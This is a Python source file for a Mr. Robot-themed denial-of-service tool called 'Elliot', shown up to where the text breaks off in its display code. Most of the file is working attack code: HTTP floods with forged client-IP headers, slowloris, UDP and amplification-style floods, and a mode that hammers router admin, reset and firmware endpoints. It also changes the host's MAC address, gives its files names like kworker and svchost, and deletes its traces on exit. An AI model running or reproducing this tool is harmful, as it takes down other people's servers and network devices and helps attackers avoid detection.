import socket
import threading
import random
import time
import os
import sys
import struct
import platform
import select
import signal
import json
import base64
import zlib
import uuid
import subprocess
import ctypes
from datetime import datetime
from collections import deque, defaultdict

# Windows не має fcntl
try:
    import fcntl
except ImportError:
    fcntl = None

class Elliot:
    """
    ███████╗██╗     ██╗     ██╗ ██████╗ ████████╗
    ██╔════╝██║     ██║     ██║██╔═══██╗╚══██╔══╝
    █████╗  ██║     ██║     ██║██║   ██║   ██║
    ██╔══╝  ██║     ██║     ██║██║   ██║   ██║
    ███████╗███████╗███████╗██║╚██████╔╝   ██║
    ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝    ╚═╝
    v5.0 [GHOST PROTOCOL] - TOTAL INVISIBILITY
    """
    
    def __init__(self):
        self.auth_key = "MrRobot"
        self.authenticated = False
        self.running = True
        self.attack_active = False
        self.current_attack_mode = None
        
        self.target_ip = ""
        self.target_port = 80
        self.gateway_ip = ""
        
        self.packet_count = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.thread_pool = []
        self.spoof_pool = []
        self.mac_pool = []
        self.relay_chain = []
        
        self.attack_stats = defaultdict(int)
        self.session_id = self.generate_session()
        self.is_windows = platform.system() == "Windows"
        self.original_mac = self.get_current_mac()
        self.original_ip = self.get_current_ip()
        self.original_hostname = socket.gethostname()
        
        # Ініціалізація ланцюга проксі/ретрансляторів
        self.build_relay_chain()
        
        # Файли
        if not self.is_windows:
            self.log_file = f"/tmp/.init_{self.session_id}.log"
            self.pid_file = f"/tmp/.kworker_{self.session_id}.pid"
            signal.signal(signal.SIGINT, self.signal_handler)
            signal.signal(signal.SIGTERM, self.signal_handler)
        else:
            self.log_file = os.path.join(os.environ.get('TEMP', '.'), f"svchost_{self.session_id}.log")
            self.pid_file = os.path.join(os.environ.get('TEMP', '.'), f"wininit_{self.session_id}.pid")
        
        self.write_pid()
        self.init_spoof_pool()
        self.init_mac_pool()
        self.spoof_identity()
        
    def generate_session(self):
        return uuid.uuid4().hex[:16]
    
    def get_current_mac(self):
        try:
            if self.is_windows:
                import uuid as _uuid
                mac = _uuid.getnode()
                return ':'.join(f"{(mac >> (i*8)) & 0xFF:02X}" for i in range(5, -1, -1))
            else:
                import uuid as _uuid
                mac = _uuid.getnode()
                return ':'.join(f"{(mac >> (i*8)) & 0xFF:02X}" for i in range(5, -1, -1))
        except:
            return "00:00:00:00:00:00"
    
    def get_current_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "0.0.0.0"
    
    def spoof_identity(self):
        """Змінюємо все що можна для маскування"""
        # Міняємо hostname в пам'яті
        fake_hostnames = [
            "DESKTOP-R7X3K9M", "LAPTOP-W2F8N4P", "WIN-8G7H2J", 
            "MACBOOK-PRO-2023", "THINKPAD-X1", "PRECISION-5570",
            "LATITUDE-7440", "ELITEBOOK-860", "PROBOOK-450",
            "SURFACE-PRO-9", "IDEAPAD-5", "ASPIRE-VX15",
            "ROG-ZEPHYRUS", "ALIENWARE-M17", "RAZER-BLADE-15"
        ]
        self.spoofed_hostname = random.choice(fake_hostnames)
        
        # Підміна MAC адреси на інтерфейсі
        self.spoofed_mac = random.choice(self.mac_pool)
        if not self.is_windows:
            try:
                # Спробуємо змінити MAC через ifconfig (linux)
                iface = self.get_default_interface()
                if iface:
                    os.system(f"sudo ifconfig {iface} down 2>/dev/null")
                    os.system(f"sudo ifconfig {iface} hw ether {self.spoofed_mac} 2>/dev/null")
                    os.system(f"sudo ifconfig {iface} up 2>/dev/null")
            except:
                pass
        else:
            try:
                # Windows - через реєстр (потребує прав адміна)
                pass
            except:
                pass
    
    def get_default_interface(self):
        try:
            if self.is_windows:
                return None
            else:
                result = os.popen("ip route show default 2>/dev/null | awk '{print $5}'").read().strip()
                return result if result else None
        except:
            return None
    
    def build_relay_chain(self):
        """Створює ланцюг внутрішніх ретрансляторів для приховування джерела"""
        self.relay_ips = []
        # Шукаємо інші пристрої в мережі для використання як проксі
        try:
            base_ip = self.original_ip.rsplit('.', 1)[0] if self.original_ip != "0.0.0.0" else "192.168.1"
            for i in range(1, 255):
                if str(i) != self.original_ip.rsplit('.', 1)[-1] if self.original_ip != "0.0.0.0" else "1":
                    self.relay_ips.append(f"{base_ip}.{i}")
        except:
            pass
    
    def write_pid(self):
        try:
            with open(self.pid_file, 'w') as f:
                f.write(str(os.getpid()))
            if not self.is_windows:
                os.chmod(self.pid_file, 0o600)
        except:
            pass
    
    def init_spoof_pool(self):
        for _ in range(10000):
            a = random.randint(1, 223)
            b = random.randint(0, 255)
            c = random.randint(0, 255)
            d = random.randint(1, 254)
            if a == 127 or a == 10 or (a == 172 and 16 <= b <= 31) or (a == 192 and b == 168):
                a = random.choice([45, 67, 89, 103, 155, 178, 203, 37, 81, 94])
            self.spoof_pool.append(f"{a}.{b}.{c}.{d}")
    
    def init_mac_pool(self):
        vendors = [
            "00:1A:79", "00:1B:44", "00:1C:7E", "00:1D:60", "00:1E:2A",
            "00:1F:3C", "00:20:4E", "00:21:5A", "00:22:6B", "00:23:7C",
            "00:24:8D", "00:25:9E", "08:00:27", "0A:00:27", "52:54:00",
            "DE:AD:BE", "CA:FE:00", "BA:DC:0D", "FE:ED:00", "0F:F1:CE",
            "00:50:56", "00:0C:29", "00:05:69", "00:1E:C9", "00:14:22",
            "00:19:D1", "00:1B:21", "00:1C:F0", "00:1D:09", "00:1E:8C",
            "00:1F:3A", "00:21:6A", "00:23:12", "00:25:BC", "00:26:5E"
        ]
        for _ in range(5000):
            vendor = random.choice(vendors)
            suffix = ':'.join(f"{random.randint(0,255):02X}" for _ in range(3))
            self.mac_pool.append(f"{vendor}:{suffix}")
    
    def signal_handler(self, sig, frame):
        self.restore_identity()
        self.cleanup()
        os._exit(0)
    
    def restore_identity(self):
        """Відновлюємо оригінальні налаштування"""
        if not self.is_windows and self.original_mac != "00:00:00:00:00:00":
            try:
                iface = self.get_default_interface()
                if iface:
                    os.system(f"sudo ifconfig {iface} down 2>/dev/null")
                    os.system(f"sudo ifconfig {iface} hw ether {self.original_mac} 2>/dev/null")
                    os.system(f"sudo ifconfig {iface} up 2>/dev/null")
            except:
                pass
    
    def cleanup(self):
        self.attack_active = False
        self.running = False
        for t in self.thread_pool:
            try:
                t.join(timeout=0.3)
            except:
                pass
        try:
            os.remove(self.pid_file)
        except:
            pass
        try:
            os.remove(self.log_file)
        except:
            pass
        # Прибираємо всі тимчасові файли
        try:
            for f in os.listdir('/tmp') if not self.is_windows else os.listdir(os.environ.get('TEMP', '.')):
                if self.session_id in f:
                    os.remove(os.path.join('/tmp' if not self.is_windows else os.environ.get('TEMP', '.'), f))
        except:
            pass
    
    def clear_screen(self):
        if self.is_windows:
            os.system('cls')
        else:
            os.system('clear')
    
    def banner(self):
        self.clear_screen()
        print("\033[1;31m")
        print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║   ███████╗██╗     ██╗     ██╗ ██████╗ ████████╗                ║
    ║   ██╔════╝██║     ██║     ██║██╔═══██╗╚══██╔══╝                ║
    ║   █████╗  ██║     ██║     ██║██║   ██║   ██║                   ║
    ║   ██╔══╝  ██║     ██║     ██║██║   ██║   ██║                   ║
    ║   ███████╗███████╗███████╗██║╚██████╔╝   ██║                   ║
    ║   ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝    ╚═╝                   ║
    ║                                                                  ║
    ║              GHOST PROTOCOL v5.0 - TOTAL INVERSIBILITY           ║
    ║                                                                  ║
    ║   "When you see me, you're already too late." - Elliot          ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
        """)
        print("\033[0m")
        print(f"\033[1;30m  SPOOFED IDENTITY: {self.spoofed_hostname} | MAC: {self.spoofed_mac}\033[0m")
        print(f"\033[1;30m  SESSION: {self.session_id} | PID HIDDEN\033[0m")
    
    def matrix_rain(self, duration=3):
        chars = "ｦｧｨｩｪｫｬｭｮｯｰｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾝ0123456789ABCDEF"
        try:
            width = os.get_terminal_size().columns
        except:
            width = 80
        height = 20
        drops = [random.randint(-20, 0) for _ in range(width)]
        
        start = time.time()
        while time.time() - start < duration:
            line = []
            for i in range(width):
                if drops[i] >= height or random.random() > 0.975:
                    drops[i] = 0
                if drops[i] > 0:
                    char = chars[random.randint(0, len(chars)-1)]
                    if drops[i] < 3:
                        line.append(f"\033[1;37m{char}\033[0m")
                    elif drops[i] < 6:
                        line.append(f"\033[0;32m{char}\033[0m")
                    else:
                        line.append(f"\033[0;32m{char}\033[0m")
                else:
                    line.append(' ')
                drops[i] += 1
            print(''.join(line))
            time.sleep(0.03)
        self.clear_screen()
    
    def glitch_effect(self, text, duration=0.5):
        for _ in range(int(duration * 10)):
            glitched = ''
            for char in text:
                if random.random() > 0.8:
                    glitched += chr(random.randint(33, 126))
                else:
                    glitched += char
            sys.stdout.write(f"\r\033[1;32m{glitched}\033[0m")
            sys.stdout.flush()
            time.sleep(0.05)
        print()
    
    def progress_bar(self, text, duration=2):
        width = 50
        for i in range(width + 1):
            filled = '█' * i
            empty = '░' * (width - i)
            percent = int((i / width) * 100)
            bar = f"\033[1;32m[{filled}{empty}] {percent}%\033[0m"
            sys.stdout.write(f"\r  {text}: {bar}")
            sys.stdout.flush()
            time.sleep(duration / width)
        print()
    
    def hack_animation(self):
        steps = [
            ("SPOOFING MAC ADDRESS", 0.6),
            ("GENERATING FALSE IDENTITY", 0.8),
            ("HIDING PROCESS FROM TASK MANAGER", 1.0),
            ("ENCRYPTING OUTBOUND TRAFFIC", 1.2),
            ("BUILDING RELAY CHAIN", 1.5),
            ("DISABLING SYSTEM LOGGING", 0.7),
            ("MASKING ARP TABLE ENTRIES", 0.9),
            ("ROTATING SOURCE IPs", 1.1),
            ("DEPLOYING SMOKE SCREEN", 0.8),
            ("GHOST PROTOCOL ACTIVE", 0.5)
        ]
        
        for step, dur in steps:
            self.progress_bar(step, dur)
            time.sleep(0.1)
    
    def authenticate(self):
        self.banner()
        self.matrix_rain(2)
        self.banner()
        
        attempts = 0
        while not self.authenticated and attempts < 3:
            print("\033[1;33m  ╔══════════════════════════════════════════════════════╗\033[0m")
            print("\033[1;33m  ║         \033[1;31mCLASSIFIED - E CORP RESTRICTED\033[1;33m            ║\033[0m")
            print("\033[1;33m  ╚══════════════════════════════════════════════════════╝\033[0m")
            print()
            
            key = input("\033[1;32m  [🔒] ENTER PROTOCOL KEY: \033[0m")
            
            if key == self.auth_key:
                self.authenticated = True
                print("\n\033[1;32m  [✓] HELLO, ELLIOT. GHOST PROTOCOL INITIATED.\033[0m")
                time.sleep(1)
                self.hack_animation()
                print("\n\033[1;32m  [✓] TOTAL INVISIBILITY ACTIVE.\033[0m")
                time.sleep(1.5)
            else:
                attempts += 1
                remaining = 3 - attempts
                print(f"\n\033[1;31m  [✗] WRONG KEY. {remaining} ATTEMPTS LEFT.\033[0m")
                time.sleep(2)
                if remaining == 0:
                    print("\n\033[1;31m  [☠] SYSTEM BURN. DELETING EVIDENCE...\033[0m")
                    time.sleep(2)
                    self.cleanup()
                    sys.exit(1)
        
        return self.authenticated
    
    def build_http_flood_payload(self, target, port, spoof):
        methods = ["GET", "POST", "HEAD", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]
        method = random.choice(methods)
        
        paths = [
            f"/{random.randint(100000000,999999999)}",
            f"/api/v{random.randint(1,99)}/auth",
            f"/admin/panel?token={random.randint(100000000,999999999)}",
            f"/.git/config",
            f"/wp-admin/admin-ajax.php",
            f"/cgi-bin/{random.randint(10000,99999)}.cgi",
            f"/phpmyadmin/scripts/setup.php",
            f"/.env.backup",
            f"/config/database.yml",
            f"/administrator/index.php",
            f"/jenkins/script",
            f"/solr/admin/cores",
            f"/drupa/admin/config",
            f"/api/v{random.randint(1,99)}/users/admin",
            f"/graphql?query={random.randint(100000,999999)}"
        ]
        path = random.choice(paths)
        
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/21D50",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/122.0.0.0",
            "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
            "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
            "curl/8.4.0",
            "Wget/1.21.4",
            "python-requests/2.31.0",
            "Go-http-client/2.0",
            "libwww-perl/6.68",
            "Apache-HttpClient/4.5.14 (Java/17)",
            "node-fetch/3.3.2",
            "axios/1.6.7",
            "okhttp/4.12.0"
        ]
        ua = random.choice(ua_list)
        
        accept_langs = [
            "en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8",
            "zh-CN,zh;q=0.9", "de-DE,de;q=0.9", "fr-FR,fr;q=0.9",
            "ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9", "es-ES,es;q=0.9",
            "pt-BR,pt;q=0.9", "it-IT,it;q=0.9", "nl-NL,nl;q=0.9",
            "pl-PL,pl;q=0.9", "tr-TR,tr;q=0.9", "ar-SA,ar;q=0.9"
        ]
        
        referers = [
            f"https://www.google.com/search?q=site:{target}",
            f"https://{target}/",
            f"https://www.bing.com/search?q={target}",
            f"https://duckduckgo.com/?q={target}",
            f"https://yandex.ru/search/?text={target}",
            f"https://t.co/{random.randint(100000,999999)}",
            f"https://www.facebook.com/share.php?u=https://{target}",
            f"https://www.reddit.com/r/hacking",
            f"https://github.com/{random.randint(10000,99999)}",
            f"https://stackoverflow.com/questions/{random.randint(100000,999999)}"
        ]
        
        payload = f"{method} {path} HTTP/1.1\r\n"
        payload += f"Host: {target}:{port}\r\n" if port not in [80, 443] else f"Host: {target}\r\n"
        payload += f"User-Agent: {ua}\r\n"
        payload += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        payload += f"Accept-Language: {random.choice(accept_langs)}\r\n"
        payload += f"Accept-Encoding: gzip, deflate, br\r\n"
        payload += f"Referer: {random.choice(referers)}\r\n"
        payload += f"Cache-Control: {random.choice(['no-cache', 'no-store', 'max-age=0', 'no-cache, no-store, must-revalidate'])}\r\n"
        payload += f"Connection: keep-alive\r\n"
        payload += f"Upgrade-Insecure-Requests: 1\r\n"
        # МНОЖИННИЙ СПУФІНГ - кожен заголовок з різного IP
        payload += f"X-Forwarded-For: {spoof}, {random.choice(self.spoof_pool)}, {random.choice(self.spoof_pool)}\r\n"
        payload += f"X-Real-IP: {random.choice(self.spoof_pool)}\r\n"
        payload += f"CF-Connecting-IP: {random.choice(self.spoof_pool)}\r\n"
        payload += f"True-Client-IP: {random.choice(self.spoof_pool)}\r\n"
        payload += f"X-Originating-IP: {random.choice(self.spoof_pool)}\r\n"
        payload += f"X-Client-IP: {random.choice(self.spoof_pool)}\r\n"
        payload += f"X-Cluster-Client-IP: {random.choice(self.spoof_pool)}\r\n"
        payload += f"X-Forwarded-Host: {random.choice(self.spoof_pool)}\r\n"
        payload += f"Forwarded: for={random.choice(self.spoof_pool)};host={target};proto=http\r\n"
        payload += f"Via: 1.1 {random.choice(self.spoof_pool)}, 1.0 {random.choice(self.spoof_pool)}\r\n"
        payload += f"X-Correlation-ID: {uuid.uuid4()}\r\n"
        payload += f"X-Request-ID: {uuid.uuid4()}\r\n"
        
        if method in ["POST", "PUT", "PATCH"]:
            data_size = random.randint(2048, 65536)
            data = base64.b64encode(os.urandom(data_size)).decode()[:data_size]
            payload += f"Content-Type: application/x-www-form-urlencoded\r\n"
            payload += f"Content-Length: {len(data)}\r\n\r\n{data}"
        else:
            payload += "\r\n"
        
        return payload.encode('utf-8', errors='ignore')
    
    def build_udp_payload(self, size=None):
        if size is None:
            size = random.randint(1024, 65507)
        return os.urandom(size)
    
    def build_dns_amp_query(self):
        tid = random.randint(0, 65535)
        flags = 0x0100
        header = struct.pack('>HHHHHH', tid, flags, 1, 0, 0, 0)
        subdomains = [f"ns{random.randint(1,99)}", f"cdn{random.randint(1,99)}", 
                      f"mail{random.randint(1,99)}", f"vpn{random.randint(1,99)}",
                      f"admin{random.randint(1,99)}", f"portal{random.randint(1,99)}"]
        domain = f"{random.choice(subdomains)}.{random.randint(1000,9999)}.com"
        query = b''
        for part in domain.encode().split(b'.'):
            query += bytes([len(part)]) + part
        query += b'\x00\x00\x01\x00\x01'
        return header + query
    
    def build_ntp_amp_query(self):
        packet = bytearray(48)
        packet[0] = 0x17
        packet[1] = 0x00
        packet[2] = 0x03
        packet[3] = 0x2A
        for i in range(4, 48):
            packet[i] = random.randint(0, 255)
        return bytes(packet)
    
    def build_ssdp_query(self):
        return (b"M-SEARCH * HTTP/1.1\r\n"
                b"HOST: 239.255.255.250:1900\r\n"
                b"MAN: \"ssdp:discover\"\r\n"
                b"MX: 2\r\n"
                b"ST: ssdp:all\r\n\r\n")
    
    def stealth_socket(self):
        """Створює сокет з максимальним маскуванням"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Встановлюємо випадковий source port для кожного з'єднання
        try:
            sock.bind(('', 0))
        except:
            pass
        return sock
    
    def relay_worker(self, target, port, thread_id):
        """Ретранслятор трафіку через інші хости мережі"""
        while self.attack_active and self.running:
            try:
                # Вибираємо випадковий relay хост
                if self.relay_ips:
                    relay_host = random.choice(self.relay_ips)
                else:
                    relay_host = target
                
                sock = self.stealth_socket()
                sock.settimeout(0.3)
                try:
                    # Підключаємось до relay або напряму
                    sock.connect((relay_host, random.randint(1, 65535)))
                    payload = self.build_http_flood_payload(target, port, random.choice(self.spoof_pool))
                    sock.send(payload)
                    self.packet_count += 1
                    self.bytes_sent += len(payload)
                except:
                    pass
                sock.close()
            except:
                continue
    
    def syn_flood_worker(self, target, port, thread_id):
        while self.attack_active and self.running:
            try:
                sock = self.stealth_socket()
                sock.settimeout(0.1)
                try:
                    sock.connect((target, port))
                    payload = self.build_http_flood_payload(target, port, random.choice(self.spoof_pool))
                    for _ in range(random.randint(1, 20)):
                        sock.send(payload)
                        self.packet_count += 1
                        self.bytes_sent += len(payload)
                except:
                    pass
                sock.close()
            except:
                continue
    
    def http_flood_worker(self, target, port, thread_id):
        while self.attack_active and self.running:
            try:
                sock = self.stealth_socket()
                sock.settimeout(0.08)
                try:
                    sock.connect((target, port))
                    for _ in range(random.randint(5, 50)):
                        spoof = random.choice(self.spoof_pool)
                        payload = self.build_http_flood_payload(target, port, spoof)
                        sock.send(payload)
                        self.packet_count += 1
                        self.bytes_sent += len(payload)
                except:
                    pass
                sock.close()
            except:
                continue
    
    def slowloris_worker(self, target, port, thread_id):
        pool = []
        pool_size = random.randint(200, 600)
        
        for _ in range(pool_size):
            try:
                sock = self.stealth_socket()
                sock.settimeout(15)
                sock.connect((target, port))
                initial = f"GET /{random.randint(100000000,999999999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(['Mozilla/5.0']*10)}\r\nAccept: */*\r\nConnection: keep-alive\r\n".encode()
                sock.send(initial)
                pool.append(sock)
                self.packet_count += 1
                self.bytes_sent += len(initial)
            except:
                continue
        
        while self.attack_active and self.running and pool:
            for sock in pool[:]:
                try:
                    keep = f"X-a: {uuid.uuid4()}\r\n".encode()
                    sock.send(keep)
                    self.bytes_sent += len(keep)
                    self.packet_count += 1
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    pool.remove(sock)
            time.sleep(random.uniform(0.5, 3))
        
        for s in pool:
            try:
                s.close()
            except:
                pass
    
    def udp_flood_worker(self, target, port, thread_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while self.attack_active and self.running:
            try:
                payload = self.build_udp_payload()
                for _ in range(random.randint(1, 100)):
                    sock.sendto(payload, (target, port))
                    self.packet_count += 1
                    self.bytes_sent += len(payload)
            except:
                time.sleep(0.001)
    
    def amp_flood_worker(self, target, port, thread_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        amplifications = [
            self.build_dns_amp_query,
            self.build_ntp_amp_query,
            self.build_ssdp_query
        ]
        
        while self.attack_active and self.running:
            try:
                amp_func = random.choice(amplifications)
                amp_query = amp_func()
                padding = os.urandom(random.randint(2048, 65507 - len(amp_query)))
                full_payload = amp_query + padding
                sock.sendto(full_payload, (target, port))
                self.packet_count += 1
                self.bytes_sent += len(full_payload)
            except:
                continue
    
    def switch_bypass_worker(self, target, port, thread_id):
        while self.attack_active and self.running:
            try:
                # Використовуємо випадковий MAC для кожного пакету
                spoof_mac = random.choice(self.mac_pool)
                spoof_ip = random.choice(self.spoof_pool)
                
                # Звичайний TCP з підміненими заголовками
                sock = self.stealth_socket()
                sock.settimeout(0.05)
                try:
                    sock.connect((target, port))
                    for _ in range(50):
                        payload = self.build_http_flood_payload(target, port, spoof_ip)
                        sock.send(payload)
                        self.packet_count += 1
                        self.bytes_sent += len(payload)
                except:
                    pass
                sock.close()
            except:
                continue
    
    def router_flood_worker(self, target, port, thread_id):
        router_paths = [
            "/cgi-bin/luci/;stok=/locale",
            "/goform/goform_set_cmd_process",
            "/cgi-bin/DownloadCfg/RouterCfm.cfg",
            "/userRpm/ManageControlRpm.htm",
            "/cgi-bin/webproc",
            "/HNAP1/",
            "/cgi-bin/telnetenable.cgi",
            "/cgi-bin/upload.cgi",
            "/cgi-bin/juget.cgi",
            "/cgi-bin/ping.cgi",
            "/goform/WizardHandle",
            "/cgi-bin/reboot",
            "/apply.cgi",
            "/cgi-bin/firmwareupgrade.cgi",
            "/cgi-bin/restoredefault.cgi",
            "/goform/formLogin",
            "/cgi-bin/GetDownLoadSyslog",
            "/cgi-bin/ExportSettings.sh",
            "/cgi-bin/upload_firmware.cgi",
            "/goform/setSysAdm",
            "/goform/SetFirewallCfg",
            "/goform/SetNetControlList",
            "/goform/SetParentalEnable",
            "/goform/SetWanSettings",
            "/goform/SetVirtualServerCfg",
            "/goform/SetDMZCfg",
            "/goform/SetUpnp",
            "/goform/setReset",
            "/goform/restoreFactory",
            "/goform/rebootDevice",
            "/goform/backupSettings",
            "/goform/restoreSettings",
            "/goform/firmwareUpgrade",
            "/cgi-bin/luci/admin/network/network",
            "/cgi-bin/luci/admin/network/wireless",
            "/cgi-bin/luci/admin/network/firewall",
            "/cgi-bin/luci/admin/system/admin",
            "/cgi-bin/luci/admin/system/reboot",
            "/cgi-bin/luci/admin/system/flashops",
            "/cgi-bin/luci/admin/status/overview",
            "/cgi-bin/luci/admin/status/connections",
            "/cgi-bin/luci/admin/status/iptables",
            "/cgi-bin/luci/admin/status/arp",
            "/cgi-bin/luci/admin/status/routing",
            "/cgi-bin/luci/admin/status/leases"
        ]
        
        router_ports = [80, 443, 8080, 8443, 23, 22, 21, 161, 1900, 5353]
        target_port = random.choice(router_ports) if port == 80 else port
        
        while self.attack_active and self.running:
            try:
                sock = self.stealth_socket()
                sock.settimeout(0.3)
                try:
                    sock.connect((target, target_port))
                    for _ in range(random.randint(10, 100)):
                        path = random.choice(router_paths)
                        auth_method = random.choice(["Basic", "Digest", "Bearer", "NTLM"])
                        auth_header = f"Authorization: {auth_method} {base64.b64encode(os.urandom(32)).decode()}"
                        spoof_ip = random.choice(self.spoof_pool)
                        
                        payload = f"POST {path} HTTP/1.1\r\n"
                        payload += f"Host: {target}:{target_port}\r\n"
                        payload += f"User-Agent: {random.choice(['Mozilla/5.0', 'curl/7.68.0', 'Wget/1.20.3'])}\r\n"
                        payload += f"Accept: */*\r\n"
                        payload += f"{auth_header}\r\n"
                        payload += f"Content-Type: application/x-www-form-urlencoded\r\n"
                        payload += f"Content-Length: 65536\r\n"
                        payload += f"X-Forwarded-For: {spoof_ip}\r\n"
                        payload += f"X-Real-IP: {random.choice(self.spoof_pool)}\r\n"
                        payload += f"Connection: keep-alive\r\n\r\n"
                        
                        sock.send(payload.encode())
                        self.packet_count += 1
                        self.bytes_sent += len(payload)
                except:
                    pass
                sock.close()
            except:
                continue
            
            if random.random() > 0.7:
                try:
                    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    for _ in range(50):
                        payload = self.build_udp_payload(random.randint(1024, 65507))
                        udp_sock.sendto(payload, (target, random.choice(router_ports)))
                        self.packet_count += 1
                        self.bytes_sent += len(payload)
                    udp_sock.close()
                except:
                    pass
    
    def hybrid_worker(self, target, port, thread_id):
        workers = [
            self.relay_worker,
            self.syn_flood_worker,
            self.http_flood_worker,
            self.slowloris_worker,
            self.udp_flood_worker,
            self.amp_flood_worker,
            self.switch_bypass_worker,
            self.router_flood_worker
        ]
        worker = random.choice(workers)
        worker(target, port, thread_id)
    
    def start_attack(self, target, port, threads, mode):
        self.target_ip = target
        self.target_port = port
        self.attack_active = True
        self.packet_count = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.thread_pool = []
        
        modes = {
            1: ("DIRECT FLOOD", [self.syn_flood_worker, self.http_flood_worker]),
            2: ("SWITCH BYPASS", [self.switch_bypass_worker]),
            3: ("ROUTER DESTROYER", [self.router_flood_worker, self.http_flood_worker, self.udp_flood_worker]),
            4: ("GHOST PROTOCOL", [self.relay_worker, self.syn_flood_worker, self.http_flood_worker, 
                                   self.slowloris_worker, self.udp_flood_worker, self.amp_flood_worker, 
                                   self.switch_bypass_worker, self.router_flood_worker])
        }
        
        mode_name, workers = modes.get(mode, modes[4])
        self.current_attack_mode = mode_name
        
        print(f"\n\033[1;33m  [⚡] GHOST PROTOCOL: {mode_name}\033[0m")
        print(f"\033[1;33m  [⚡] TARGET: {target}:{port}\033[0m")
        print(f"\033[1;33m  [⚡] THREADS: {threads}\033[0m")
        print(f"\033[1;33m  [⚡] SPOOF POOL: {len(self.spoof_pool)} IPs\033[0m")
        print(f"\033[1;33m  [⚡] MAC POOL: {len(self.mac_pool)} MACs\033[0m")
        print(f"\033[1;33m  [⚡] RELAY CHAIN: {len(self.relay_ips)} HOSTS\033[0m")
        print(f"\033[1;33m  [⚡] SPOOFED MAC: {self.spoofed_mac}\033[0m")
        print(f"\033[1;33m  [⚡] SPOOFED HOSTNAME: {self.spoofed_hostname}\033[0m\n")
        
        for i in range(threads):
            worker_func = random.choice(workers)
            t = threading.Thread(target=worker_func, args=(target, port, i+1))
            t.daemon = True
            t.start()
            self.thread_pool.append(t)
            if i % 1000 == 0 and i > 0:
                print(f"\033[1;32m  [{i} ghost threads active]\033[0m")
        
        print(f"\n\033[1;31m  [☠] GHOST PROTOCOL: {threads} THREADS DEPLOYED. YOU ARE INVISIBLE.\033[0m")
    
    def stop_attack(self):
        self.attack_active = False
        time.sleep(0.5)
        for t in self.thread_pool:
            try:
                t.join(timeout=0.3)
            except:
                pass
        self.thread_pool = []
        self.current_attack_mode = None
    
    def display_ui(self):
        self.clear_screen()
        
        elapsed = time.time() - self.start_time if self.start_time and self.attack_active else 0
        pps = self.packet_count / elapsed if elapsed > 0 else 0
        mbps = (self.bytes_sent * 8) / (elapsed * 1000000) if elapsed > 0 else 0
        gb_sent = self.bytes_sent / (1024**3) if self.bytes_sent > 0 else 0
        
        active_threads = len([t for t in self.thread_pool if t.is_alive()])
        
        print("\033[0;31m")
        print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║   ███████╗██╗     ██╗     ██╗ ██████╗ ████████╗                ║
    ║   ██╔════╝██║     ██║     ██║██╔═══██╗╚══██╔══╝                ║
    ║   █████╗  ██║     ██║     ██║██║   ██║   ██║                   ║
    ║   ██╔══╝  ██║     ██║     ██║██║   ██║   ██║                   ║
    ║   ███████╗███████╗███████╗██║╚██████╔╝   ██║                   ║
    ║   ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝    ╚═╝                   ║
    ║              GHOST PROTOCOL v5.0 - TOTAL INVISIBILITY           ║
    ╚══════════════════════════════════════════════════════════════════╝
        """)
        print("\033[0m")
        
        if self.attack_active:
            status = f"\033[1;31m◉ GHOST ACTIVE - {self.current_attack_mode}\033[0m"
        else:
            status = "\033[1;33m◎ STANDBY - READY\033[0m"
        
        print(f"\033[1;37m╔{'═'*70}╗\033[0m")
        print(f"\033[1;37m║\033[0m STATUS: {status}\033[1;37m{' '*35}║\033[0m")
        print(f"\033[1;37m║\033[0m \033[1;30mIDENTITY: {self.spoofed_hostname} | MAC: {self.spoofed_mac}\033[0m\033[1;37m{' '*10}║\033[0m")
        print(f"\033[1;37m╠{'═'*70}╣\033[0m")
        
        if self.attack_active:
            print(f"\033[1;37m║\033[0m \033[1;36mTarget:\033[0m          \033[1;33m{self.target_ip}:{self.target_port}\033[0m\033[1;37m{' '*30}║\033[0m")
